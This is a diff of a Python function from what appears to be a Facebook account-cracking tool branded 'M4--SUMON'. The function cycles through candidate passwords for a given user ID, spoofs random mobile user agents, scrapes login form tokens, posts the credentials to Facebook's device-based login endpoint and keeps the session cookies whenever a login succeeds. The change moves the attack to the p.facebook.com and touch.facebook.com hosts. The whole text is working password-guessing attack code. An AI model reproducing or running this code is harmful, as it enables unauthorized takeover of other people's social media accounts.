@@ -2001,58 +2001,55 @@ def mobile(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M4--SUMON) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M4--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            Session.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-            p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=140810032656374&kid_directed_site=0&app_id=140810032656374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D61c74856-ed0f-4045-b074-b15f877f9e10%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%23_%3D_&display=touch&locale=es_LA&pl_dbl=0&refsrc=deprecated&_rdr")
+            free_fb = Session.get('https://touch.facebook.com/').text
             data = {
-            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(p.text)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'pass': pw,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'false',
-            'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"', str(p.text)).group(1)}
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-            koki+=' m_pixel_ratio=2.625; wd=412x756'
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email": uid,
+            "pass": pw,
+            "login":"Log In"}
             headers = {
-            "Host": "m.facebook.com",
-            "content-length": f"{len(str(dataa))}",
-            "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-            "origin": "https://m.facebook.com",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": ua,
-            "accept": "*/*",
-            "x-requested-with": "com.microsoft.bing",
-            "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-            "sec-ch-ua-platform": '"Android"',
-            "sec-ch-ua-mobile": "?1",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-user": "?1",
-            "referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=140810032656374&kid_directed_site=0&app_id=140810032656374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D61c74856-ed0f-4045-b074-b15f877f9e10%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJUMiDpdgLW2kqY-z2dKtIVwYyWQ4Ft1uT3fY2uBxJOs%23_%3D_&display=touch&locale=es_LA&pl_dbl=0&refsrc=deprecated&_rdr",
-            "accept-encoding": "gzip, deflate br",
-            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-            }
+            'Host': 'p.facebook.com',
+            'user-agent': ua,
+            'Accept-Encoding': 'gzip',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Connection': 'keep-alive',
+            'authority': 'p.facebook.com',
+            'method': 'POST',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'Content-Length': f'{len(str(data))}',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '2.75',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"X663"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'viewport-width': '980',
+            'Content-Type': 'application/x-www-form-urlencoded'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            po = Session.post(url, data=data, cookies={'cookie': koki}, headers=headers,allow_redirects=False).text
+            url = "https://p.facebook.com/login/device-based/login/async/"
+            po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
